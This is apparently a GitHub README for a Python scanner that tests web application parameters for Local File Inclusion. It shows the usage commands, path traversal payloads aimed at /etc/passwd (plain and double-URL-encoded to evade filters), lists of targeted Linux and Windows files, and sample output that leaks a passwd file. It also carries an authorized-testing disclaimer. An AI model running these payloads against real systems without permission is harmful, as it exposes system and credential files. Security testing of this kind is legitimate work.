# 🔍 LFI Scanner by Clyde

[![Python](https://img.shields.io/badge/Python-3.6%2B-blue?logo=python)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
[![Status](https://img.shields.io/badge/status-active-brightgreen)](#)
[![Issues](https://img.shields.io/github/issues/clydedc/lfi-scanner)](https://github.com/clydedc/lfi-scanner/issues)

A simple and efficient Python tool to detect **Local File Inclusion (LFI)** vulnerabilities in web applications. It leverages common file path payloads and supports optional double URL encoding to bypass filters.

---

## 📌 Features

* ✅ Automatically injects LFI payloads into a specified URL parameter.
* 🔁 Supports both standard and double URL encoding.
* 🧠 Detects potential LFI via common response patterns (`/etc/passwd`, Apache logs, etc.).
* 🎨 Colored console output for better readability.

---

## ⚙️ Installation

```bash
git clone https://github.com/clydedc/lfi-scanner.git
cd lfi-scanner
pip install -r requirements.txt
```

> **Dependencies** (from `requirements.txt`):
>
> ```
> requests
> colorama
> ```

---

## 🚀 Usage

```bash
python3 lfi.py <URL> <parameter> 
```

### Example

```bash
python3 lfi.py https://target.com/index.php page
```

This will test payloads like:

```
https://target.com/index.php?page=../../../../../../../../etc/passwd
```

And their **double-encoded** equivalents:

```
https://target.com/index.php?page=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

---

## 🧪 Technical Details

* **Included payloads**:

  * Linux: `/etc/passwd`, `/proc/self/environ`, Apache logs, etc.
  * Windows: `boot.ini`, `win.ini`, system32 hosts/services, etc.

* **Encoding modes**:

  * `normal`: plain path traversal.
  * `double`: double-URL-encoded strings to evade WAFs and filters.

* **Response signatures checked**:

  * `root:x` (Linux passwd file)
  * `127.0.0.1`, `[apache`, `PATH=`, `USER=`, and others.

---

## 📦 Sample Output

```bash
[+] Starting LFI Scan on https://target.com/index.php

[*] Testing payload (normal): https://target.com/index.php?page=../../../../etc/passwd
[+] Possible LFI detected with payload (normal): https://target.com/index.php?page=../../../../etc/passwd
[+] Snippet:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## 👤 Author

**Clyde**
🔗 [GitHub Profile](https://github.com/clydedc)

---

## ⚠️ Disclaimer

> This tool is intended **strictly for educational purposes and authorized penetration testing**.
> **Unauthorized use** against third-party systems is **illegal and unethical**.

